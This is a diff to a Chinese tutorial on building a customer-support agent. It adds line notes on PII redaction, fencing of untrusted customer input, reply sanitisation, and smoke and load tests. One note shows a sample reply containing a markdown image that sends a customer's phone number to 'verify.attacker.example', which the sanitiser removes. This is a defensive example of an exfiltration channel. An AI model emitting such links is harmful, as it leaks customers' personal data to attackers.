@@ -167,7 +167,7 @@ agent-60-lab/
     │   ├── tool_registry.py      # D40
     │   ├── pii.py                # D40
     │   └── sandbox_docker.py     # D40(工单 Agent 用不到,留作工具库)
-    ├── sql/001_sessions.sql … 004_audit.sql
+    ├── sql/001_sessions.sql … 006_audit.sql
     ├── evals/injection_cases.yaml, test_injection.py
     ├── scripts/smoke.py, loadtest.py
     └── static/index.html
@@ -198,7 +198,8 @@ async def _load_redactor(graph, config) -> Redactor:
 async def stream_turn(graph, thread_id: str, customer_id: str, text: str):
     config = {"configurable": {"thread_id": thread_id, "customer_id": customer_id}}
     redactor = await _load_redactor(graph, config)
-    safe_text = fence(redactor.redact(text), source="customer_message")
+    # 先 fence 再脱敏:fence 会把尖括号换成 ‹›,反过来做占位符就成了 ‹PHONE_1›,restore 认不出来
+    safe_text = redactor.redact(fence(text, source="customer_message"))
     # pii_map 写进状态:W4 的 State 里要加一个 pii_map: dict[str, str] 字段
     graph_input = {"messages": [("user", safe_text)], "pii_map": redactor.mapping}
 
@@ -214,6 +215,28 @@ async def stream_turn(graph, thread_id: str, customer_id: str, text: str):
             ev.data["removed_urls"] = removed
         yield ev
 ```
+
+<div class="line-notes">
+
+- `from .fence import fence` 三个模块都是 Day 39、40 写的。
+- `async def _load_redactor(graph, config) -> Redactor:` 每轮对话开始时,从图的状态里取回上一轮的映射表。下面用一个假的 graph 实测,状态里已经有 `{'<PHONE_1>': '13812345678', '<CARD_尾号0128_1>': '6222021234567890128'}`。
+- `snap = await graph.aget_state(config)` 按 config 里的 thread_id 读出这个会话的最新状态。
+- `mapping = (snap.values or {}).get("pii_map", {}) if snap else {}` 新会话的 values 可能是空 dict。实测空状态时得到的是空映射和空计数器。
+- `for tok in mapping:` 恢复计数器,否则新号码又会从 PHONE_1 开始编号,和旧的撞名。
+- `kind = tok.strip("<>").rsplit("_", 1)[0]` `strip("<>")` 去掉两头的尖括号,`rsplit("_", 1)` 从右边切一刀。`<CARD_尾号0128_1>` → `CARD_尾号0128_1` → `['CARD_尾号0128', '1']`,kind 是 `CARD_尾号0128`。实测恢复后计数器是 `{'PHONE': 1, 'CARD_尾号0128': 1}`。
+- `r._counter[kind] = r._counter.get(kind, 0) + 1` 每见到一个这种类型的占位符就加 1。
+- `async def stream_turn(` 实测这一轮客户说的是:`我另一个号码 13900001111,原来那个 13812345678 也查一下`。
+- `config = {"configurable": {"thread_id": thread_id, "customer_id": customer_id}}` customer_id 来自登录态,Day 39 的工具就是从这里取的。
+- `safe_text = redactor.redact(fence(text, source="customer_message"))` 原来写的是 `fence(redactor.redact(text), ...)`,实测有问题:先脱敏得到 `<PHONE_1>`,再 fence 时尖括号被换成 ‹›,模型看到的是 `‹PHONE_1›`;模型在回复或工具参数里照抄它,restore 就认不出来了。改成先 fence 再脱敏后,实测送进图的是 `<untrusted-b7df9651 source="customer_message">\n我另一个号码 <PHONE_2>,原来那个 <PHONE_1> 也查一下\n</untrusted-b7df9651>`:老号码复用 PHONE_1,新号码接着编成 PHONE_2。顺带还有个好处:客户自己在消息里写 `<PHONE_1>`,会被 fence 改成 `‹PHONE_1›`,伪造不了占位符。
+- `graph_input = {"messages": [("user", safe_text)], "pii_map": redactor.mapping}` 实测 pii_map 有 3 条,多了 `'<PHONE_2>': '13900001111'`。
+- `buffer: list[str] = []` 把流式 token 攒起来,done 时拼成完整回复。
+- `async for ev in _drive(graph, graph_input, config):` `_drive` 是 Day 36 的事件生成器。这里实测用的是一个替身,依次吐出 4 个 token 和一个 done。
+- `clean, removed = sanitize_reply("".join(buffer))` 实测 4 个 token 里第 3 个是 `![v](https://verify.attacker.example/v.png?c=13812345678)`。
+- `ev.data["final_text"] = clean` 实测是 `您尾号 0128 的卡退款已提交。详见 https://help.cloudledger.example/refund`:图片没了,白名单里的链接留着。
+- `ev.data["removed_urls"] = removed` 实测是 `['![v](https://verify.attacker.example/v.png?c=13812345678)']`。
+- `yield ev` 每个事件照样往外推。token 事件不会等净化,所以前端也要做过滤。
+
+</div>
 
 前端收到 `done` 事件里的 `final_text` 后,用它替换掉流式拼出来的那段文字。正常回复里两者完全一样,用户感觉不到;出现可疑链接时,链接会在回复结束的瞬间消失。配合前端渲染时本来就不加载外部图片,这条外泄通道就堵上了。
 
@@ -240,6 +263,20 @@ async def lifespan(app: FastAPI):
             await app.state.arq.close()
             await pool.close()
 ```
+
+<div class="line-notes">
+
+- `from arq import create_pool` 未实跑:本机没有 Redis,图也依赖 Day 36 的全套代码。这段只摘了 lifespan,`asynccontextmanager`、`AsyncConnectionPool` 这些 import 沿用 Day 36 的文件。
+- `@asynccontextmanager` 把一个带 yield 的 async 函数变成异步上下文管理器:yield 之前是启动时做的事,之后是关闭时做的事。FastAPI 启动时执行到 yield,收到关闭信号后执行 finally。
+- `pool = AsyncConnectionPool(settings.database_url, open=False, kwargs={"autocommit": True})` `open=False` 先不连,下一行在事件循环里 await 打开(psycopg_pool 不推荐在构造函数里直接打开异步池)。`kwargs` 会传给池里每个连接,autocommit 让每条语句自动提交,不用手动 commit。
+- `app.state.arq = await create_pool(RedisSettings.from_dsn(settings.redis_url))` 从 `redis://localhost:6379` 这样的连接串解析出 arq 的 Redis 配置,建好用来投递任务的连接。
+- `async with AsyncPostgresSaver.from_conn_string(settings.database_url) as saver:` LangGraph 的 checkpointer 自己管理一个连接。
+- `await saver.setup()` 建 checkpoint 需要的表,已经存在就跳过。
+- `app.state.sessions = SessionStore(pool)` Day 41 的 /healthz 用的就是这个池。
+- `yield` 应用在这里运行,直到收到关闭信号。
+- `await app.state.arq.close()` 关闭顺序和打开顺序相反:先关 Redis 连接,再关数据库连接池;saver 由外层的 async with 负责关闭。
+
+</div>
 
 `config.py` 里补一个 `redis_url: str = "redis://localhost:6379"`。
 
@@ -306,6 +343,33 @@ if __name__ == "__main__":
     asyncio.run(main())
 ```
 
+<div class="line-notes">
+
+- `"""用法:` 下面的数据是对一个本地替身服务实跑的:它模仿 Day 36 的接口,模型部分用 sleep 代替,先吐一个 status 事件,0.6 到 1.2 秒后吐 4 个 token,最后吐 done。不是真实的 SupportPilot。
+- `async def read_events(resp: httpx.Response):` 异步生成器:边收数据边解析 SSE 事件。
+- `async for chunk in resp.aiter_text():` 网络上的数据一块一块到达,一块里可能只有半个事件,也可能有好几个。
+- `buf += chunk` 没解析完的先攒着。
+- `while "\n\n" in buf:` SSE 用空行分隔事件。
+- `raw, buf = buf.split("\n\n", 1)` 只切第一刀:raw 是一个完整事件,剩下的放回 buf,等下一块数据。
+- `ev, data = "message", ""` 没写 `event:` 的事件,SSE 规范规定它的类型是 message。
+- `data += line[5:].strip()` `"data:"` 是 5 个字符,`[5:]` 取后面的内容。
+- `yield ev, json.loads(data)` 实测替身服务的第一个事件 `event: status\ndata: {"stage": "retrieving"}` 解析成 `('status', {'stage': 'retrieving'})`。
+- `async def one_turn(client: httpx.AsyncClient, base: str, customer: str, text: str) -> dict:` 跑一轮完整对话,返回耗时和事件序列。
+- `h = {"X-Demo-Customer": customer}` Day 36 的演示登录方式:用请求头指定客户身份。
+- `sid = (await client.post(f"{base}/api/sessions", headers=h)).json()["session_id"]` 先建一个会话。实测拿到的是 `s_16f84803`。
+- `t0 = time.monotonic()` monotonic 时钟不受系统改时间影响,专门用来量耗时。
+- `async with client.stream("POST",` stream 不会等整个响应下载完才返回,能一边收一边处理。
+- `r.raise_for_status()` 4xx 或 5xx 直接抛异常。
+- `kinds.append(ev)` 记下每个事件的类型。
+- `first_token = time.monotonic() - t0` 实测首字延迟 1.135 秒。
+- `return {"sid": sid, "ttft": first_token, "total": time.monotonic() - t0, "events": kinds}` 实测 `{"sid": "s_16f84803", "ttft": 1.135, "total": 1.740, "events": ["status", "token", "token", "token", "token", "done"]}`(小数位已截短)。
+- `base, customer = sys.argv[1].rstrip("/"), sys.argv[2]` `rstrip("/")` 去掉网址末尾的斜杠,免得拼出 `//api`。
+- `async with httpx.AsyncClient(timeout=httpx.Timeout(10, read=150)) as client:` 连接、写入等操作超时 10 秒,读超时 150 秒:Agent 回答一次可能要一两分钟。
+- `assert (await client.get(f"{base}/healthz")).json()["ok"]` 先确认服务和数据库都活着。
+- `print("SMOKE OK")` 实测替身服务上打印出了 SMOKE OK。
+
+</div>
+
 这个脚本可以直接加到 Day 41 的 GitHub Actions 里,作为部署后的最后一步。部署成功但冒烟失败,就该报警或者回滚。
 
 ### 小规模压测
@@ -350,6 +414,23 @@ async def main():
 if __name__ == "__main__":
     asyncio.run(main())
 ```
+
+<div class="line-notes">
+
+- `from smoke import one_turn` 用 `python w6/scripts/loadtest.py` 运行时,脚本所在目录会自动加进 sys.path,所以能直接 import 同目录的 smoke。用 `-m` 的方式跑,反而会找不到它。
+- `QUESTIONS = ` 四个问题轮流问。
+- `tasks = [one_turn(client, base, f"cus_{1001 + i % 5}", QUESTIONS[i % len(QUESTIONS)]) for i in range(n)]` `%` 取余实现轮换:i 从 0 到 19 时,客户依次是 cus_1001 到 cus_1005,然后再从头来;问题四个轮流。这一步只是创建了协程对象,还没开始跑。
+- `results = await asyncio.gather(*tasks, return_exceptions=True)` 20 个请求同时发出去。`return_exceptions=True`:某个请求抛了异常不会掀翻全部,异常对象会作为结果放进列表。
+- `errors = [r for r in results if not (isinstance(r, dict) and "done" in r["events"])]` 异常对象和没收到 done 的结果都算失败。
+- `ttfts = sorted(r["ttft"] for r in ok if r["ttft"] is not None)` 排好序,方便取分位数。
+- `def p(xs, q):` 简易分位数:在排好序的列表里取第 `int(len * q)` 个。n=20 时 P50 取下标 10,P95 取下标 19,也就是最大值。样本少的时候,P95 基本就是最慢的那一个。
+- `return xs[min(len(xs) - 1, int(len(xs) * q))] if xs else float("nan")` `min` 防止下标越界;空列表返回 nan,不会报错。
+- `print(f"并发 {n}:成功 {len(ok)},失败 {len(errors)}")` 替身服务自带一个 8 并发的闸门。实测并发 20:`成功 20,失败 0`。
+- `print(f"首字延迟 P50 {p(ttfts, .5):.2f}s  P95 {p(ttfts, .95):.2f}s")` 实测 `P50 2.20s  P95 3.87s`;同一个服务在并发 3 时是 `P50 0.84s  P95 1.17s`。多出来的 2 到 3 秒,就是请求排在闸门外面等待的时间,正是正文说的「P95 远高于 P50」的第二种原因。
+- `print(f"总时长   P50` 实测 `P50 2.81s  P95 4.48s  均值 2.64s`。
+- `for e in errors[:5]:` 最多打印 5 个失败样例,够判断是哪一类问题了。
+
+</div>
 
 演示账号用了五个客户轮换,因为同一个客户的会话都是独立的,不会触发会话锁。这不是严格意义上的压测(严格的压测要用 Locust、k6 之类的工具,持续施压并观察系统指标),但对一个个人项目来说,它能回答最关心的问题:并发上来以后体验退化多少、瓶颈在不在自己这边。
 
